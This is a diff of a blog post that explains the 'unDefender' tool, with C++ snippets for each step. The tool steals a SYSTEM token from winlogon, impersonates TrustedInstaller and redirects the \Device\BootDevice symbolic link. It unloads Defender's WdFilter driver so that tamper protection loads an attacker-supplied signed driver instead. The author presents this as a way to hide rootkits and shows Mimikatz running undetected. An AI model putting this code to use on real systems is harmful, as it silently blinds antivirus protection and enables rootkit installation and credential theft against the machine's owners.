@@ -5,36 +5,36 @@ subtitle: Killing Defender through NT symbolic links redirection while keeping i
 author:
 - last
 ---
-### TL;DR
-With Administrator level privileges and without interacting with the GUI, it's possible to prevent Defender from doing its job while keeping it alive and without disabling tamper protection by redirecting the \Device\BootDevice NT symbolic link which is part of the NT path from where Defender's WdFilter driver binary is loaded. This can also be used to make Defender load an arbitrary driver, which no tool succeeds in locating. The code to do that is in APTortellini's Github repository [unDefender](https://github.com/APTortellini/unDefender)
-### Introduction
-Some time ago I had a chat with [jonasLyk](LINK_HERE) of the [Secret Club](secret.club) hacker collective about [a technique he devised](LINK_TO_TWEET) to disable Defender without making it obvious it was disabled and/or invalidating its tamper protection feature. What I liked about this technique was that it employed some really clever NT symbolic links shenanigans I'll try to outline in this blog post (which, coincidentally, is also the first one of the Advanced Persistent Tortellini collective :D). Incidentally, this techniques makes for a great way to hide a rootkit inside a Windows system, as Defender can be tricked into loading an arbitrary driver (that, sadly, has to be signed) and no tool is able to pinpoint it, as you'll be able to see in a while. Grab a beer, and enjoy the ride lads!
-### Win32 paths, NT paths and NT symbolic links
+#### TL;DR
+With Administrator level privileges and without interacting with the GUI, it's possible to prevent Defender from doing its job while keeping it alive and without disabling tamper protection by redirecting the `\Device\BootDevice` NT symbolic link which is part of the NT path from where Defender's WdFilter driver binary is loaded. This can also be used to make Defender load an arbitrary driver, which no tool succeeds in locating. The code to do that is in APTortellini's Github repository [unDefender](https://github.com/APTortellini/unDefender)
+#### Introduction
+Some time ago I had a chat with [jonasLyk](https://twitter.com/jonasLyk) of the [Secret Club](https://secret.club) hacker collective about [a technique he devised](https://twitter.com/jonasLyk/status/1378143191279472644) to disable Defender without making it obvious it was disabled and/or invalidating its tamper protection feature. What I liked about this technique was that it employed some really clever NT symbolic links shenanigans I'll try to outline in this blog post (which, coincidentally, is also the first one of the [Advanced Persistent Tortellini](https://aptw.tf/about/) collective :D). Incidentally, this techniques makes for a great way to hide a rootkit inside a Windows system, as Defender can be tricked into loading an arbitrary driver (that, sadly, has to be signed) and no tool is able to pinpoint it, as you'll be able to see in a while. Grab a beer, and enjoy the ride lads!
+#### Win32 paths, NT paths and NT symbolic links
 When loading a driver in Windows there are two ways of specifying where on the filesystem the driver binary is located: Win32 paths and NT paths. A complete analysis of the subtle differences between these two kinds of paths is out of the scope of this article, but [James Forshaw already did a great job at explaining it](https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html). Essentially, Win32 paths are a dumbed down version of the more complete NT paths and heavily rely on NT symbolic links. Win32 paths are the familiar path we all use everyday, the ones with letter drives, while NT paths use a different tree structure on which Win32 paths are mapped. Let's look at WdFilter's specific example:
 
 | Win32 path                                 | NT Path                                                         |
 | :----------------------------------------- | :-------------------------------------------------------------- |
 | C:\Windows\System32\Driver\wd\WdFilter.sys | \Device\HarddiskVolume4\Windows\System32\Driver\wd\WdFilter.sys |
 
-When using explorer.exe to navigate the folders in the filesystem we use Win32 paths and in fact the path you see in the table above is exactly the path in which you can find WdFilter.sys, though it's just an abstraction layer as the kernel really uses NT paths to work and Win32 paths are translated to NT paths before being consumed by the OS.  
+When using `explorer.exe` to navigate the folders in the filesystem we use Win32 paths and in fact the path you see in the table above is exactly the path in which you can find `WdFilter.sys`, though it's just an abstraction layer as the kernel really uses NT paths to work and Win32 paths are translated to NT paths before being consumed by the OS.  
   
-To make things a bit more complicated, NT paths can make use of NT symbolic links, just as there are symbolic links in Win32 paths. In fact, drive letters like C: and D: are actually NT symbolic links to NT paths: as you can see in the table above, on my machine C: is a NT symbolic link to the NT path \Device\HarddiskVolume4. A number of NT symbolic links is used for various purposes, one of them is to specify the path of certain drivers, like WdFilter for example: by querying it using the CLI we can see the path from which it's loaded:
+To make things a bit more complicated, NT paths can make use of NT symbolic links, just as there are symbolic links in Win32 paths. In fact, drive letters like `C:` and `D:` are actually NT symbolic links to NT paths: as you can see in the table above, on my machine `C:` is a NT symbolic link to the NT path `\Device\HarddiskVolume4`. A number of NT symbolic links is used for various purposes, one of them is to specify the path of certain drivers, like WdFilter for example: by querying it using the CLI we can see the path from which it's loaded:
 
 ![sc.exe qc wdfilter]({{site.baseurl}}/img/wdfilterpath.PNG)
 
-As you can see it's not the one we showed in the table above, as \SystemRoot is a NT symbolic link. Using SysInternals' Winobj.exe we can see that \SystemRoot points to \Device\BootDevice\Windows. \Device\BootDevice is itself another symbolic link to, at least for my machine, \Device\HarddiskVolume4. Like all objects in the Windows kernel, NT symbolic links' security is subordinated to ACL. Let's inspect them:
+As you can see it's not exactly the one we showed in the table above, as `\SystemRoot` is a NT symbolic link. Using SysInternals' Winobj.exe we can see that `\SystemRoot` points to `\Device\BootDevice\Windows`. `\Device\BootDevice` is itself another symbolic link to, at least for my machine, `\Device\HarddiskVolume4`. Like all objects in the Windows kernel, NT symbolic links' security is subordinated to ACL. Let's inspect them:
 
 ![symlink acl]({{site.baseurl}}/img/symlinkacl.PNG)
 
-As you can see, SYSTEM (and Administrators) don't have READ/WRITE privilege on the NT symbolic link \SystemRoot (although we can query it and see where it points to), but they have the DELETE privilege. Factor in the fact SYSTEM can create new NT symbolic links and you get yourself the ability to actually change the NT symbolic link: just delete it and recreate it pointing it to something you control. The same applies for other NT symbolic links, \Device\BootDevice included. To actually rewrite this kind of symbolic link we need to use native APIs as there are no Win32 APIs for that.
-### The code
+SYSTEM (and Administrators) don't have READ/WRITE privilege on the NT symbolic link `\SystemRoot` (although we can query it and see where it points to), but they have the DELETE privilege. Factor in the fact SYSTEM can create new NT symbolic links and you get yourself the ability to actually change the NT symbolic link: just delete it and recreate it pointing it to something you control. The same applies for other NT symbolic links, `\Device\BootDevice` included. To actually rewrite this kind of symbolic link we need to use native APIs as there are no Win32 APIs for that.
+#### The code
 I'll walk you through some code snippets from our project [unDefender](https://github.com/APTortellini/unDefender) which abuses this behaviour. Here's a flowchart of how the different pieces of the software work:
 
 ![unDefender flowchart]({{site.baseurl}}/img/undefenderFlowchart.PNG)
 
-All the functions used in the program are defined in the common.h header. Here you will also find definitions of the Nt functions I had to dynamically load from ntdll. Note that I wrap the HANDLE, HMODULE and SC\_HANDLE types in custom types part of the RAII namespace as I heavily rely on C++'s [RAII paradigm](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization) in order to safely handle these types. These custom RAII types are defined in the raii.h header and implemented in their respective .cpp files.
+All the functions used in the program are defined in the `common.h` header. Here you will also find definitions of the Nt functions I had to dynamically load from `ntdll`. Note that I wrap the `HANDLE`, `HMODULE` and `SC_HANDLE` types in custom types part of the RAII namespace as I heavily rely on C++'s [RAII paradigm](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization) in order to safely handle these types. These custom RAII types are defined in the `raii.h` header and implemented in their respective `.cpp` files.
 #### Getting SYSTEM
-First things first, we elevate our token to a SYSTEM one. This is easily done through the GetSystem function, implemented in the GetSystem.cpp file. Here we basically open winlogon.exe, a SYSTEM process running unprotected in every Windows session,  using the OpenProcess API. After that we open its token, through OpenProcessToken, and impersonate it using ImpersonateLoggedOnUser, easy peasy. 
+First things first, we elevate our token to a SYSTEM one. This is easily done through the `GetSystem` function, implemented in the `GetSystem.cpp` file. Here we basically open `winlogon.exe`, a SYSTEM process running unprotected in every Windows session,  using the `OpenProcess` API. After that we open its token, through `OpenProcessToken`, and impersonate it using `ImpersonateLoggedOnUser`, easy peasy. 
 
 ```C++
 #include "common.h"
@@ -70,9 +70,9 @@ bool GetSystem()
 }
 ```
 #### Saving the symbolic link current state
-After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the GetSymbolicLinkTarget implemented in the GetSymbolicLinkTarget.cpp file. After resolving the address of the Nt functions (skipped in the following snippet) we define two key data structures: a UNICODE\_STRING and an OBJECT\_ATTRIBUTES. These two are initialized through RtlInitUnicodeString and InitializeObjectAttributes. The UNICODE\_STRING is initialized using the symLinkName variable, which is of type std::wstring and is one of the arguments passed to GetSymbolicLinkTarget by the main function. The first one is a structure the Windows kernel uses to work with unicode strings (duh!) and is necessary for initializing the second one, which in turn is used to open a handle to the NT symlink using NtOpenSymbolicLinkObject with GENERIC\_READ access. Before that though we define a HANDLE which will be filled by NtOpenSymbolicLinkObject itself and that we will assign to the corresponding RAII type (I have yet to implement a way of doing it directly without using a temporary disposable variable, I'm lazy).
+After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the `GetSymbolicLinkTarget` implemented in the `GetSymbolicLinkTarget.cpp` file. After resolving the address of the Nt functions (skipped in the following snippet) we define two key data structures: a `UNICODE_STRING` and an `OBJECT_ATTRIBUTES`. These two are initialized through the `RtlInitUnicodeString` and `InitializeObjectAttributes` APIs. The `UNICODE_STRING` is initialized using the `symLinkName` variable, which is of type `std::wstring` and is one of the arguments passed to `GetSymbolicLinkTarget` by the main function. The first one is a structure the Windows kernel uses to work with unicode strings (duh!) and is necessary for initializing the second one, which in turn is used to open a handle to the NT symlink using  the `NtOpenSymbolicLinkObject` native API with `GENERIC_READ` access. Before that though we define a `HANDLE` which will be filled by `NtOpenSymbolicLinkObject` itself and that we will assign to the corresponding RAII type (I have yet to implement a way of doing it directly without using a temporary disposable variable, I'm lazy).
 
-Done that we proceed to initialize a second UNICODE\_STRING which will be used to store the symlink target retrieved by NtQuerySymbolicLinkObject, which takes as arguments the RAII::Handle we initialized before, the second UNICODE\_STRING we just initialized and a nullptr as we don't care about the bytes read. Done that we return the buffer of the second UNICODE\_STRING and call it a day.
+Done that we proceed to initialize a second `UNICODE_STRING` which will be used to store the symlink target retrieved by  the `NtQuerySymbolicLinkObject` native API, which takes as arguments the `RAII::Handle` we initialized before, the second `UNICODE_STRING` we just initialized and a `nullptr` as we don't care about the number of bytes read. Done that we return the buffer of the second `UNICODE_STRING` and call it a day.
 ```C++
 UNICODE_STRING symlinkPath;
 RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
@@ -101,7 +101,7 @@ return LinkTarget.Buffer;
 ```
 
 #### Changing the symbolic link
-Now that we have stored the older symlink target it's time we change it. To do so we once again setup the two UNICODE\_STRING and OBJECT\_ATTRIBUTES structures that will identify the symlink we want to target and then call the native function NtOpenSymbolicLink to get a handle to said symlink with DELETE privileges.
+Now that we have stored the older symlink target it's time we change it. To do so we once again setup the two `UNICODE_STRING` and `OBJECT_ATTRIBUTES` structures that will identify the symlink we want to target and then call the native function `NtOpenSymbolicLink` to get a handle to said symlink with `DELETE` privileges.
 
 ```C++
 UNICODE_STRING symlinkPath;
@@ -113,14 +113,14 @@ HANDLE symlinkHandle;
 NTSTATUS status = NtOpenSymbolicLinkObject(&symlinkHandle, DELETE, &symlinkObjAttr);
 ```
 
-After that, we proceed to delete the symlink. To do that we first have to call NtMakeTemporaryObject and pass it the handle to the symlink we just got. That's because this kind of symlinks are created with the OBJ_PERMANENT attribute, which increases the reference counter of their kernel object in kernelspace by 1. This means that even if all handles to the symbolic link are closed, the symbolic link will continue to live in the kernel object manager. So, in order to delete it we have to make the object no longer permanent (hence temporary), which means NtMakeTemporaryObject simply decreases the reference counter by one. When we call CloseHandle after that on the handle of the symlink, the reference counter goes to zero and the object is destroyed:
+After that, we proceed to delete the symlink. To do that we first have to call the native function `NtMakeTemporaryObject` and pass it the handle to the symlink we just got. That's because this kind of symlinks are created with the `OBJ_PERMANENT` attribute, which increases the reference counter of their kernel object in kernelspace by 1. This means that even if all handles to the symbolic link are closed, the symbolic link will continue to live in the kernel object manager. So, in order to delete it we have to make the object no longer permanent (hence temporary), which means `NtMakeTemporaryObject` simply decreases the reference counter by one. When we call  the `CloseHandle` API after that on the handle of the symlink, the reference counter goes to zero and the object is destroyed:
 
 ```C++
 status = NtMakeTemporaryObject(symlinkHandle);
 CloseHandle(symlinkHandle);
 ```
 
-Once we have deleted the symlink it's time to recreate it and make it point to the new target. This is done by initializing again a UNICODE\_STRING and a OBJECT\_ATTRIBUTES and calling NtCreateSymbolicLinkObject:
+Once we have deleted the symlink it's time to recreate it and make it point to the new target. This is done by initializing again a `UNICODE_STRING` and a `OBJECT_ATTRIBUTES` and calling the `NtCreateSymbolicLinkObject` API:
 ```C++
 UNICODE_STRING target;
 RtlInitUnicodeString(&target, newDestination.c_str());
@@ -142,20 +142,20 @@ return STATUS_SUCCESS;
 ```
 
 Note two things:
-1. when calling InitializeObjectAttributes we pass the OBJ_PERMANENT attribute as argument, so that the symlink is created as permanent, in order to avoid having the symlink destroyed when unDefender exits;
-2. right before returning STATUS_SUCCESS we call CloseHandle on the newly created symlink. This is necessary because if the handle stays open the reference counter of the symlink will be 2 (1 for the handle, plus 1 for the OBJ\_PERMANENT) and we won't be able to delete it later when we will try to restore the old symlink.  
+1. when calling `InitializeObjectAttributes` we pass the `OBJ_PERMANENT` attribute as argument, so that the symlink is created as permanent, in order to avoid having the symlink destroyed when unDefender exits;
+2. right before returning `STATUS_SUCCESS` we call `CloseHandle` on the newly created symlink. This is necessary because if the handle stays open the reference counter of the symlink will be 2 (1 for the handle, plus 1 for the `OBJ_PERMANENT`) and we won't be able to delete it later when we will try to restore the old symlink.  
 
-At this point the symlink is changed and points to a location we have control on. In this location we will have constructed a directory tree which mimicks WdFilter's one and copied our arbitrary driver, conveniently renamed WdFilter.sys - we do it in the first line of the main function through a series of system() function calls. I know it's uncivilized to do it this way, deal with it.
-### Killing Defender
-Now we move to the juicy part, killing Damnfender! This is done in the ImpersonateAndUnload function (implemented in ImpersonateAndUnload.cpp) in 4 steps:
- 1. start the TrustedInstaller service & process;
+At this point the symlink is changed and points to a location we have control on. In this location we will have constructed a directory tree which mimicks WdFilter's one and copied our arbitrary driver, conveniently renamed `WdFilter.sys` - we do it in the first line of the main function through a series of `system()` function calls. I know it's uncivilized to do it this way, deal with it.
+#### Killing Defender
+Now we move to the juicy part, killing Damnfender! This is done in the `ImpersonateAndUnload` helper function (implemented in `ImpersonateAndUnload.cpp`) in 4 steps:
+ 1. start the TrustedInstaller service and process;
  2. open TrustedInstaller's first thread;
  3. impersonate its token;
- 4. unload Wdfilter;
-We need to impersonate TrustedInstaller because the Defender and WdFilter services have ACLs which gives full control on them only to NT SERVICE\TrustedInstaller and not to SYSTEM or Administrators.
+ 4. unload WdFilter;
+We need to impersonate TrustedInstaller because the Defender and WdFilter services have ACLs which gives full control on them only to `NT SERVICE\TrustedInstaller` and not to SYSTEM or Administrators.
 
-#### Step 1 - Starting TrustedInstaller
-The first thing to do is starting the TrustedInstaller service. To do so we need to get a handle (actually a SC\_HANDLE, which a particular type of HANDLE for the Service Control Manager.) on the Service Control Manager using the OpenSCManagerW API, then use that handle to call OpenServiceW on the TrustedInstaller service and get a handle on it, and finally use that handle to call StartServiceW.  This will start the TrustedInstaller service, which in turn will start the TrustedInstaller process, whose token contains the SID of NT SERVICE\TrustedInstaller. Pretty straightforward, here's the code:
+##### Step 1 - Starting TrustedInstaller
+The first thing to do is starting the TrustedInstaller service. To do so we need to get a `HANDLE` (actually a `SC_HANDLE`, which is a particular type of `HANDLE` for the Service Control Manager.) on the Service Control Manager using the `OpenSCManagerW` API, then use that `HANDLE` to call `OpenServiceW` on the TrustedInstaller service and get a `HANDLE` on it, and finally pass that other `HANDLE` to `StartServiceW`. This will start the TrustedInstaller service, which in turn will start the TrustedInstaller process, whose token contains the SID of `NT SERVICE\TrustedInstaller`. Pretty straightforward, here's the code:
 ```C++
 RAII::ScHandle svcManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
 if (!svcManager.GetHandle())
@@ -183,8 +183,8 @@ if (!success && GetLastError() != 0x420) // 0x420 is the error code returned whe
 }
 else std::cout << "[+] Successfully started the TrustedInstaller service!\n";
 ```
-#### Step 2 - Open TrustedInstaller's first thread
-Now that the TrustedInstaller process is alive, we need to open a handle its first thread, so that we can call NtImpersonateThread on it in step 3. This is done using the following code:
+##### Step 2 - Open TrustedInstaller's first thread
+Now that the TrustedInstaller process is alive, we need to open a handle its first thread, so that we can call  the native API `NtImpersonateThread` on it in step 3. This is done using the following code:
 ```C++
 auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
 if (trustedInstPid == ERROR_FILE_NOT_FOUND)
@@ -208,9 +208,9 @@ if (!hTrustedInstThread.GetHandle())
 }
 else std::cout << "[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the TrustedInstaller process' first thread!\n";
 ```
-FindPID and GetFirstThreadID are two helper functions I implement in FindPID.cpp and GetFirstThreadID.cpp which do exactly what their names tell you: they find the PID of the process you pass them and give you the TID of its first thread, easy. We need the first thread as it will have for sure the NT SERVICE\TrustedInstaller SID in it. Once we've got the thread ID we pass it to the OpenThread API with the THREAD\_DIRECT\_IMPERSONATION access right, which enables us to use the returned handle with NtImpersonateThread later.
-#### Step 3 - Impersonate TrustedInstaller
-Now that we have a powerful enough handle we can call NtImpersonateThread on it. But first we have to initialize a SECURITY\_QUALITY\_OF\_SERVICE data structure to tell the kernel which kind of impersonation we want to perform, in this case SecurityImpersonation, that's a impersonation level which allows us to impersonate the security context of our target locally ([look here for more information on Impersonation Levels](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels)):
+`FindPID` and `GetFirstThreadID` are two helper functions I implemented in `FindPID.cpp` and `GetFirstThreadID.cpp` which do exactly what their names tell you: they find the PID of the process you pass them and give you the TID of its first thread, easy. We need the first thread as it will have for sure the `NT SERVICE\TrustedInstaller` SID in it. Once we've got the thread ID we pass it to the `OpenThread` API with the `THREAD_DIRECT_IMPERSONATION` access right, which enables us to use the returned handle with `NtImpersonateThread` later.
+##### Step 3 - Impersonate TrustedInstaller
+Now that we have a powerful enough handle we can call `NtImpersonateThread` on it. But first we have to initialize a `SECURITY_QUALITY_OF_SERVICE` data structure to tell the kernel which kind of impersonation we want to perform, in this case `SecurityImpersonation`, that's a impersonation level which allows us to impersonate the security context of our target locally ([look here for more information on Impersonation Levels](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels)):
 ```C++
 SECURITY_QUALITY_OF_SERVICE sqos = {};
 sqos.Length = sizeof(sqos);
@@ -225,9 +225,9 @@ else
 }
 ```
 
-If NtImpersonateThread did its job well our thread should have the SID of TrustedInstaller now. Note: in order not to fuck up the main thread's token, ImpersonateAndUnload is called by main a sacrificial std::thread. Now that we have the required access rights, we can go to step 4 and actually unload the driver.
-#### Step 4 - Unloading WdFilter.sys
-To unload WdFilter we first have to release the lock imposed on it by Defender itself. This is achieved by restarting the WinDefend service using the same approach we used to start TrustedInstaller's one. But first we need to give our token the ability to load and unload drivers. This is done by enabling the SeLoadDriverPrivilege in our security context by calling the helper function SetPrivilege, defined in SetPrivilege.cpp, and by passing to it our thread's token and the privilege we want to enable:
+If `NtImpersonateThread` did its job well our thread should have the SID of TrustedInstaller now. Note: in order not to fuck up the main thread's token, `ImpersonateAndUnload` is called by main in a sacrificial `std::thread`. Now that we have the required access rights, we can go to step 4 and actually unload the driver.
+##### Step 4 - Unloading WdFilter.sys
+To unload WdFilter we first have to release the lock imposed on it by Defender itself. This is achieved by restarting the WinDefend service using the same approach we used to start TrustedInstaller's one. But first we need to give our token the ability to load and unload drivers. This is done by enabling the `SeLoadDriverPrivilege` in our security context by calling the helper function `SetPrivilege`, defined in `SetPrivilege.cpp`, and by passing it our thread's token and the privilege we want to enable:
 ```C++
 HANDLE tempHandle;
 success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
@@ -243,7 +243,7 @@ success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true)
 if (!success) return 1;
 ```
 
-Once we have the SeLoadDriverPrivilege enabled we proceed to restart the Defender's service, WinDefend:
+Once we have the `SeLoadDriverPrivilege` enabled we proceed to restart Defender's service, WinDefend:
 ```C++
 RAII::ScHandle winDefendSvc = OpenServiceW(svcManager.GetHandle(), L"WinDefend", SERVICE_ALL_ACCESS);
 if (!winDefendSvc.GetHandle())
@@ -276,7 +276,7 @@ if (!success)
 else std::cout << "[+] Successfully restarted the WinDefend service!\n";
 ```
 
-The only thing different from when we started TrustedInstaller is that we first have to stop the service using the ControlService API (by passing the SERVICE\_CONTROL\_STOP control code) and then start it back using StartServiceW once again. Once Defender's restarted, the lock on WdFilter is released and we can call NtUnloadDriver on it:
+The only thing different from when we started TrustedInstaller's service is that we first have to stop the service using the `ControlService` API (by passing the `SERVICE_CONTROL_STOP` control code) and then start it back using `StartServiceW` once again. Once Defender's restarted, the lock on WdFilter is released and we can call `NtUnloadDriver` on it:
 
 ```C++
 UNICODE_STRING wdfilterDrivServ;
@@ -294,8 +294,8 @@ else
 }
 return status;
 ```
-NtUnloadDriver gets a single argument, which is a UNICODE\_STRING containing the driver's registry path (which is a NT path, as \Registry can be seen using WinObj). If everything went according to plan, WdFilter has been unloaded from the kernel.
-### Reloading and restoring the symlink
+The native function `NtUnloadDriver` gets a single argument, which is a `UNICODE_STRING` containing the driver's registry path (which is a NT path, as `\Registry` can be seen using WinObj). If everything went according to plan, WdFilter has been unloaded from the kernel.
+#### Reloading and restoring the symlink
 Now that WdFilter has been unloaded, Defender's tamper protection should kick in in a matter of moments and immediately reload it, while also locking it in order to prevent further unloadings. If the symlink has been changed successfully and the directory structure has been created correctly what will be loaded is the driver we provided (which in unDefender's case is RWEverything). Meanwhile, in 10 seconds, unDefender will restore the original symlink by calling ChangeSymlink again and passing it the old symlink target.
 
 ![undefender demo]({{site.baseurl}}/img/undefenderdemo.gif)
@@ -305,8 +305,8 @@ In the demo you can notice a few things:
 - I managed to copy and run Mimikatz without Defender complaining.
 Note: Defender's icon became yellow in the lower right because it was unhappy with me disabling automatic sample submission, it's unrelated to unDefender.
 
-### References
-1. https://twitter.com/jonasLyk/status/1378143191279472644
-2. https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html
-3. https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html
-4. https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html
+#### References
+1. [](https://twitter.com/jonasLyk/status/1378143191279472644)
+2. [](https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html)
+3. [](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
+4. [](https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html)
